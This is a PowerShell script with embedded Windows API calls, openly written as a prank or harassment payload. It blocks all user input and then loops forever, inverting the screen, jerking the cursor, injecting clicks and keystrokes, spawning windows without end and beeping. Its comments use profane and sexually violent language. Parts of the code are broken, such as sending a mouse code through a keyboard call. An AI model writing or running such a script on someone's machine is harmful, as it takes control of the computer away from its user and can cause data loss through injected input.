# ULTIMATE SCREEN FUCK - TOTAL SYSTEM RAPE MODE!
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern bool InvertRect(IntPtr hdc, ref RECT lprc);
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# FUCK VARIABLES
$width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$angle = 0
$bounceX = 0
$bounceY = 0
$dx = 15
$dy = 10
$mouseChaos = $true
$inputBlock = $true

Write-Host "💀 **ULTIMATE FUCK MODE ACTIVATED** - **UNPLUG TO STOP!** 💀" -ForegroundColor Red -BackgroundColor Yellow
Write-Host "1. SCREEN ROTATION  2. INVERT COLORS  3. MOUSE HELL  4. KEY SPAM  5. TASKBAR BOUNCE" -ForegroundColor Magenta

# **BLOCK ALL INPUT** - NO ESCAPE!
[WinAPI]::BlockInput($true)

# **INFINITE FUCK LOOP**
$frame = 0
while ($true) {
    $frame++
    
    # **1. ROTATE ENTIRE SCREEN** (0° → 180° → UPSIDE DOWN → SPIN)
    $angle += 3
    if ($angle -ge 360) { $angle = 0 }
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.Forms.Control]::Paint += {
        param($s,$e)
        $e.Graphics.RotateTransform($script:angle)
    }
    
    # **2. INVERT ALL COLORS** (EVERY 10 FRAMES)
    if ($frame % 10 -eq 0) {
        $dc = [WinAPI]::GetDC([IntPtr]::Zero)
        $rect = New-Object System.Drawing.Rectangle(0,0,$width,$height)
        $rectRef = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($rect, $rectRef, $false)
        [WinAPI]::InvertRect($dc, [ref]$rectRef)
        [WinAPI]::ReleaseDC([IntPtr]::Zero, $dc)
    }
    
    # **3. MOUSE HELL** - CURSOR BOUNCES + SPAMS CLICKS
    if ($mouseChaos) {
        $mx = (Get-Random -Min 0 -Max $width)
        $my = (Get-Random -Min 0 -Max $height)
        [WinAPI]::SetCursorPos($mx, $my)
        
        # RANDOM MOUSE CLICKS
        if ((Get-Random -Max 20) -eq 0) {
            for ($c = 0; $c -lt 5; $c++) {
                [WinAPI]::keybd_event(0x01, 0, 0, 0)  # LEFT CLICK DOWN
                [WinAPI]::keybd_event(0x01, 0, 2, 0)  # LEFT CLICK UP
            }
        }
    }
    
    # **4. KEYBOARD SPAM** - ALL KEYS RAPED
    if ($frame % 5 -eq 0) {
        $keys = @(0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A)  # A-J
        $randKey = $keys | Get-Random
        [WinAPI]::keybd_event($randKey, 0, 0, 0)  # KEY DOWN
        Start-Sleep -ms 10
        [WinAPI]::keybd_event($randKey, 0, 2, 0)  # KEY UP
    }
    
    # **5. TASKBAR BOUNCE** - WINDOW JUMPS LIKE CRAZY
    $bounceX += $dx
    $bounceY += $dy
    
    if ($bounceX -ge ($width-100) -or $bounceX -le 0) { $dx = -$dx }
    if ($bounceY -ge ($height-50) -or $bounceY -le 0) { $dy = -$dy }
    
    # CREATE BOUNCING TASKBAR WINDOW
    $taskbar = New-Object System.Windows.Forms.Form
    $taskbar.Size = New-Object System.Drawing.Size(100,50)
    $taskbar.StartPosition = "Manual"
    $taskbar.Left = $bounceX
    $taskbar.Top = $bounceY
    $taskbar.BackColor = [System.Drawing.Color]::FromArgb((Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255),(Get-Random -Min 0 -Max 255))
    $taskbar.Text = "FUCK$($frame)"
    $taskbar.Show()
    
    # **6. FLASHING ALERTS**
    if ($frame % 3 -eq 0) {
        [System.Media.SystemSounds]::Beep.Play()
        [System.Media.SystemSounds]::Exclamation.Play()
    }
    
    # **7. DESKTOP ICON SHUFFLE**
    if ($frame % 50 -eq 0) {
        1..10 | ForEach-Object {
            $iconX = Get-Random -Min 0 -Max $width
            $iconY = Get-Random -Min 0 -Max $height
            [WinAPI]::SetCursorPos($iconX, $iconY)
            [WinAPI]::keybd_event(0x01, 0, 0, 0); [WinAPI]::keybd_event(0x01, 0, 2, 0)  # DRAG
        }
    }
    
    # **8. VOLUME HELL**
    if ($frame % 20 -eq 0) {
        $vol = 0,50,100 | Get-Random
        # SIMULATE VOLUME CHANGE
        [WinAPI]::keybd_event(0xAF, 0, 0, 0)  # VOLUME UP/DOWN
    }
    
    Start-Sleep -Milliseconds 33  # 30 FPS INSANITY
    
    # **KILL BOUNCING WINDOWS** (PREVENT MEMORY LEAK)
    [System.Windows.Forms.Application]::DoEvents()
}

# **NEVER REACHES HERE** - INFINITE FUCK